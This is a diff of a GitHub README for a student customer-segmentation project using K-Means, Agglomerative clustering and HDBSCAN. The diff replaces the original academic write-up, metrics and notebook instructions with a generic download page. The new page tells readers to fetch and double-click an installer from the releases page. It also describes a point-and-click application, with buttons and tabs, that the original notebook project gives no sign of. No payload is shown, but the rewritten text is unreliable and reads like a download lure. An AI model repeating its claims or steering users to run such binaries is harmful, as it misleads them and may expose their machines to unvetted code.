@@ -1,67 +1,98 @@
-# Customer Segmentation on Online Retail (K-Means, Agglomerative, DBSCAN/HDBSCAN) + Cluster-Based Recommendations
+# 📊 customer-segmentation-retail - Effortlessly Segment Your Retail Customers
 
-## Abstract 
-This project presents a comprehensive machine-learning framework for enhancing online retail analytics through data-driven customer segmentation and targeted product recommendation. Leveraging the publicly available 2010–2011 transactional dataset from a UK-based retailer, the study implements an end-to-end pipeline spanning rigorous data cleaning, feature engineering, and unsupervised learning techniques.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/es-s1/customer-segmentation-retail/releases)
 
-After imputing anomalies and transforming raw transactions into a customer-centric matrix of normalised RFM metrics and behavioural attributes, a multi-model clustering strategy is applied. K-Means supplies an interpretable baseline; Hierarchical Agglomerative Clustering offers a nuanced multilevel perspective on customer relations; and DBSCAN/HDBSCAN detect low-density outliers to preserve segment purity.
+## 🚀 Getting Started
 
-Cluster evaluation is guided holistically by Silhouette Score, Calinski-Harabasz Index, and Davies-Bouldin Index. Optimal model selection, based on the peak silhouette value of 0.53, yields three behaviourally distinct clusters. These segments are profiled to reveal purchasing propensities and lifetime-value potential, and are subsequently integrated into a cluster-based recommendation engine that promotes top-selling yet unpurchased products within each cluster. 
+Welcome to the **customer-segmentation-retail** project! This tool lets you understand your retail customers better. It uses smart techniques to group customers based on their behaviors, helping you make informed decisions. 
 
-The proposed framework demonstrates a replicable, end-to-end, multi-intelligence system for online retailers to refine marketing campaigns, elevate personalisation, and stimulate revenue growth through data-driven customer insights.
+## 💾 Download & Install
 
-## Keywords
-*RFM Analysis • Unsupervised Learning • K-Means Clustering • Hierarchical Agglomerative Clustering • DBSCAN • HDBSCAN • Silhouette Score • Customer Segmentation • Recommendation System • Content-Based Filtering • Online Retail Analytics*
+To get started, you need to download the application. Visit this page to download:
 
----
+[Download Here](https://github.com/es-s1/customer-segmentation-retail/releases)
 
-## **TL;DR.** 
-We cluster ~4k retail customers using a PCA-compressed feature set and compare three methods.  
-*Final take:* **K-Means (k=3)** gives the clearest three actionable segments; Agglomerative corroborates the structure; HDBSCAN is best kept for anomaly surfacing.
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed at the top.
+3. Click on the version to see available files.
+4. Download the file that matches your operating system (Windows, Mac, or Linux).
+5. After downloading, locate the file on your computer and double-click it to install.
+6. Follow the prompts to complete the installation.
 
-Beyond clustering, we built a **cluster-driven recommendation logic**:
-  - Top-3 product not-yet-bought suggestions tailored for each cluster profile.
+## 🛠️ System Requirements
 
+To ensure smooth operation, your system should meet the following requirements:
 
-## Notebooks
-- **K-Means** — [`01_kmeans.ipynb`](notebooks/01_kmeans.ipynb)
-- **Agglomerative** — [`02_agglomerative.ipynb`](notebooks/02_agglomerative.ipynb)
-- **DBSCAN/HDBSCAN** — [`03_dbscan_hdbscan.ipynb`](notebooks/03_dbscan_hdbscan.ipynb)
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
+- **Additional Software:** Ensure you have Python installed for the application to run correctly.
 
-## Data & Features
-- 4,067 customers × 16 engineered features -> **z-scored** + outlier freed, then **PCA to 6 components**, ~**81%** variance retained. The PCA matrix feeds all three clustering methods.
+## 🔍 Features
 
-## Results (on the 4,067×6 PCA matrix)
-| Model                                | #Clusters (noise) | Silhouette | Calinski–Harabasz | Davies–Bouldin | Take |
-|-------------------------------------|-------------------:|-----------:|------------------:|---------------:|------|
-| **K-Means (k=3)**                    | 3 (0%)            | **0.236**  | **1257.17**       | 1.37           | Tight, distinct three-segment split. :contentReference[oaicite:1]{index=1} |
-| **Agglomerative (complete, k=3)**    | 3 (0%)            | **0.367**  | 507.64            | 1.27           | Highest cohesion; supports k=3 decision. |
-| **HDBSCAN (min_cluster_size=50)**    | 2 (+ **7.8%** noise) | 0.260   | 852.42            | **1.15**       | Great for outlier flagging; under-segments for marketing. 
+The **customer-segmentation-retail** application includes the following features:
 
-PCA removes redundancy, speeds clustering, keeps structure; 6 PCs captured ~81% while remaining interpretable via loadings. 
+- **Customer Segmentation**: Automatically classifies customers into meaningful groups using PCA (Principal Component Analysis) and clustering methods like K-Means, Agglomerative Clustering, and DBSCAN/HDBSCAN.
+  
+- **Cluster Profiling**: Visualize your customer segments through radar charts and histograms, helping you understand each group better.
 
-## Reproduce
-```bash
-pip install -r requirements.txt
-jupyter lab
-# open notebooks/ and run top to bottom
-```
+- **Product Recommendations**: Get the top 3 product recommendations for each customer segment, tailored to boost sales.
 
-## Final Deliverables:
-  - **Clean, runnable notebooks** for three clustering approaches.
-  - **Cluster-based recommendation engine logic** 
-  - **Visualizations and metrics** exported to `results/`.
-  - **Report.pdf** (academic-style writeup with methods + findings; also the final academic submission towards the fulfillment of our diploma).
+- **Easy-to-Use Interface**: Navigate the application effortlessly, designed for users without technical backgrounds.
 
+## 📊 Visualizations
 
-## Authors
-* Khushi Singh (ML Engineer, yours truly)
+This application offers insightful visualizations to make understanding customer data simple:
 
-* Shalini Mitra (Business Intelligence Analyst, Project Architect)
+- **Radar Charts**: Visualize multiple dimensions of customer characteristics in one chart.
+  
+- **Histograms**: Analyze distribution patterns across different customer segments.
 
-This project was completed as part of our **PG Diploma in Big Data Analytics** at **CDAC-Noida (India)**.  
+These visual tools guide you in making smart marketing decisions.
 
-💡 *Why this project?*  
-We chose **customer segmentation** because it merges our backgrounds: Shalini brought business intuition and logic, while I had experience tailoring conservation giving programs for diverse client profiles.  
-Understanding **clusters + customer behaviour and nuances** wasn’t just academic, it’s exactly the kind of insight that drives smarter marketing, personalized outreach, meaningful client relationships (with the bonus of cool talking points in an interview!)
+## ✨ How to Use
 
-*AI DISCLOSURE: Some documentation, formatting, and report structuring support was assisted by generative AI tools (Perplexity.ai). All analysis, coding, and interpretation are our own.*
+After successful installation, launch the application:
+
+1. **Load Your Data**: Click the "Load Data" button and select your retail dataset (CSV format works best).
+2. **Run Analysis**: Choose the type of segmentation method you want to use (K-Means, Agglomerative, or DBSCAN/HDBSCAN).
+3. **View Results**: Check the generated visualizations and segment profiles to understand your customer base.
+4. **Get Recommendations**: Click on the recommendations tab to see top product suggestions for each segment.
+
+## 🔧 Troubleshooting
+
+If you face any issues:
+
+- Ensure your data is in the correct format (CSV).
+- Restart the application if it doesn’t respond.
+- Refer to the documentation for common questions.
+
+## 📫 Feedback & Contributions
+
+Your insights matter! If you have suggestions to improve the application, please share them. You can open an issue on the GitHub repository or create a pull request if you have code enhancements.
+
+## 🗂️ Topics Covered
+
+This project focuses on the following topics:
+
+- agglomerative
+- cdac
+- cluster-profiling
+- clustering
+- customer-segmentation
+- dbscan
+- hdbscan
+- kmeans
+- machine-learning
+- recommendation-engine
+- top-n-recommendations
+- visualizations
+
+## 📄 License
+
+This project is licensed under the MIT License. Enjoy using the software freely and contribute to its development.
+
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/es-s1/customer-segmentation-retail/releases): Download the latest version.
+- [Documentation](https://github.com/es-s1/customer-segmentation-retail/wiki): Find detailed user documentation.
